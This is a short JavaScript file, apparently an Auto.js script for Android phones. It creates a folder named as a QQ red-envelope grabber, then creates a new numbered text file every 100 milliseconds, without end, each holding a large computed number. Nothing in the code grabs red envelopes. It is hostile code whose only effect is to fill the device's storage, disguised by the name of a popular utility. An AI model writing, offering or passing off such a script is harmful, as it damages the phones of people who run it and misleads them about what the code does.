info();

function info() {
    files.createWithDirs("/sdcard/QQ抢红包/")
    files.ensureDir("/sdcard/QQ抢红包/")
    main();
}

function main() {
    var i = 1;

    setInterval(function() {
        i++;
        files.create("/sdcard/QQ抢红包/" + i + ".txt")
        files.write("/sdcard/QQ抢红包/" + i + ".txt", i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i * i)
    }, 100);



}